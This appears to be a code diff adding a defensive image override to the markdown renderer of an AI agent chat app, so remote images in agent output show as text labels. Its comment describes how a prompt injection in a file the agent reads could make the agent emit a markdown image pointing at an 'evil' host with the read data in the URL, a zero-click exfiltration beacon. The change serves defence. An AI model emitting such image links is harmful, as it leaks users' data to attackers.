@@ -1690,12 +1690,28 @@ function MarkdownTable({ children }: { children?: React.ReactNode }) {
 /// render as live elements, and a `<base>` tag silently repoints every relative URL
 /// in the app. Nothing here ever reaches `dangerouslySetInnerHTML`: markdown-to-jsx
 /// compiles to a React element tree and produces no HTML string at any point.
+
+/// The agent's markdown is untrusted: it echoes file contents, and a file can carry
+/// a prompt injection. An `<img>` fetches its src the instant it renders, with no
+/// click, so `![](https://evil/?leak=<whatever the agent just read>)` is a working
+/// exfiltration beacon — the request itself is the payload. The CSP's `img-src 'self'`
+/// blocks the fetch, but a CSP is one regression away from silence, and a blocked
+/// image still renders as a broken-image box that says nothing about why.
+///
+/// So remote images never become an `<img>` at all. Grok can't see images anyway
+/// (`promptCapabilities.image` is false), so a remote one in its output is either a
+/// hallucinated URL or an attack; neither deserves a network request.
+function MarkdownImage({ alt, src }: { alt?: string; src?: string }) {
+  const label = (alt ?? "").trim();
+  return <span className="md-dead-link">{label ? `image: ${label}` : "image"}{src ? "" : ""}</span>;
+}
+
 const MARKDOWN_OPTIONS = {
   disableParsingRawHTML: true,
   // Without this a one-line answer compiles to a bare inline span, so the same
   // message would be spaced differently depending on its length.
   forceBlock: true,
-  overrides: { a: MarkdownLink, table: MarkdownTable },
+  overrides: { a: MarkdownLink, table: MarkdownTable, img: MarkdownImage },
 } as const;
 
 /// Memoized on `text` alone, which is what keeps streaming from going quadratic.
